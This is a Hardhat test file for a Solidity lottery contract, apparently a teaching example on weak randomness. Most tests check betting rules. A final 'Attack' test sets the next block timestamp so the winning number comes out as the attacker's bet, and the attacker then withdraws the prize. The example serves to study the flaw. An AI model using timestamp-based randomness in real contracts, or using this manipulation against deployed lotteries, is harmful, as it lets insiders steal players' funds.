const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Weak Randomness", () => {
  let deployer, attacker, user;

  beforeEach(async () => {
    [deployer, attacker, user] = await ethers.getSigners();

    const LotteryProb = await ethers.getContractFactory(
      "LotteryProb",
      deployer
    );
    this.lotteryProb = await LotteryProb.deploy();
  });

  describe("Lottery", () => {
    describe("With bets open", () => {
      it("should allow the user to place a bet", async () => {
        await this.lotteryProb.placeBet(5, {
          value: ethers.utils.parseEther("10"),
        });
        expect(await this.lotteryProb.bets(deployer.address)).to.eq(5);
      });
      it("should revert if a user place more than one bet", async () => {
        await this.lotteryProb.placeBet(5, {
          value: ethers.utils.parseEther("10"),
        });
        await expect(
          this.lotteryProb.placeBet(150, {
            value: ethers.utils.parseEther("10"),
          })
        ).to.be.revertedWith("Only 1 bet per player");
      });
      it("should revert if bet is != 10 eth", async () => {
        await expect(
          this.lotteryProb.placeBet(150, {
            value: ethers.utils.parseEther("5"),
          })
        ).to.be.revertedWith("Bets cost: 10 ether");
        await expect(
          this.lotteryProb.placeBet(150, {
            value: ethers.utils.parseEther("15"),
          })
        ).to.be.revertedWith("Bets cost: 10 ether");
      });
      it("should revert if bet number is not greater than 0", async () => {
        await expect(
          this.lotteryProb.placeBet(0, { value: ethers.utils.parseEther("10") })
        ).to.be.revertedWith("Must be a number from 1 to 255");
      });
    });
    describe("With bets closed", () => {
      it("should revert if a user place a bet", async () => {
        await this.lotteryProb.endLottery();
        await expect(
          this.lotteryProb.placeBet(150, {
            value: ethers.utils.parseEther("10"),
          })
        ).to.be.revertedWith("Bets are closed");
      });
      it("should only allow winner to call withdrawPrice()", async () => {
        await this.lotteryProb.connect(user).placeBet(5, {
          value: ethers.utils.parseEther("10"),
        });
        await this.lotteryProb.connect(attacker).placeBet(150, {
          value: ethers.utils.parseEther("10"),
        });
        await this.lotteryProb.placeBet(173, {
          value: ethers.utils.parseEther("10"),
        });

        let winningNumber = 0;

        while (winningNumber != 5) {
          await this.lotteryProb.endLottery();
          winningNumber = await this.lotteryProb.winningNumber();
          console.log(winningNumber);
        }

        await expect(
          this.lotteryProb.connect(attacker).withdrawPrize()
        ).to.be.revertedWith("You aren't the winner");
        const userInitialBalance = await ethers.provider.getBalance(
          user.address
        );
        await this.lotteryProb.connect(user).withdrawPrize();
        const userFinalBalance = await ethers.provider.getBalance(user.address);
        expect(userFinalBalance).to.be.gt(userInitialBalance);
      });
    });
    describe("Attack", () => {
      it("A miner could temper a result", async () => {
        await this.lotteryProb
          .connect(attacker)
          .placeBet(5, { value: ethers.utils.parseEther("10") });
        await this.lotteryProb
          .connect(user)
          .placeBet(150, { value: ethers.utils.parseEther("10") });
        await this.lotteryProb.placeBet(73, {
          value: ethers.utils.parseEther("10"),
        });

        await ethers.provider.send("evm_setNextBlockTimestamp", [1651997811]); // This time will produce 5 as random number

        let winningNumber = 0;

        while (winningNumber != 5) {
          await this.lotteryProb.endLottery();
          winningNumber = await this.lotteryProb.winningNumber();
          console.log(winningNumber);
        }

        console.log(await ethers.provider.getBlock("latest"));

        const attackInitialBalance = await ethers.provider.getBalance(
          attacker.address
        );
        await this.lotteryProb.connect(attacker).withdrawPrize();
        const attackFinalBalance = await ethers.provider.getBalance(
          attacker.address
        );

        expect(attackFinalBalance).to.be.gt(attackInitialBalance);
      });
    });
  });
});
